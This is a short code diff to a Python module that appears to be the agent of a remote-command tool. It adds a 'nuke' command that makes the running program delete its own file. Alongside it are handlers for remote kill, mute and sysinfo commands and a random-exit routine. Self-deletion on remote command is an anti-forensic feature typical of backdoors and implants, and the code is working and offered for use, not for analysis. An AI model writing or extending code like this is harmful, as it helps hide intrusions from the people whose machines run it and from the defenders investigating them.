@@ -6,6 +6,7 @@ def init( storage ) :
 		'kill' : 'KI',
 		'mute' : 'MU',
 		'unmute' : 'UM',
+		'nuke' : 'NK',
 	}
 	storage['commands'] = Commands
 	def wait_exit() :
@@ -13,6 +14,12 @@ def init( storage ) :
 		time.sleep(random.randint(1,5))
 		os._exit(random.randint(0,256))
 	storage['wait_exit_func'] = wait_exit
+
+	def nuke() :
+		import os, sys
+		filename = sys.argv[0]
+		os.unlink(filename)
+	storage['nuke_func'] = nuke
 
 	def dummy_send(raw) : return
 	storage['dummy_send_func'] = dummy_send
@@ -44,6 +51,9 @@ def work( storage, message ) :
 		storage['COMMON']['handler'].send_function = storage['real_send_func']
 		return "OK" #
 
+	elif message == storage['commands']['nuke'] :
+		storage['nuke_func']()
+		return "OK" #
 
 	elif message == storage['commands']['sysinfo'] :
 		import platform, json, getpass, locale
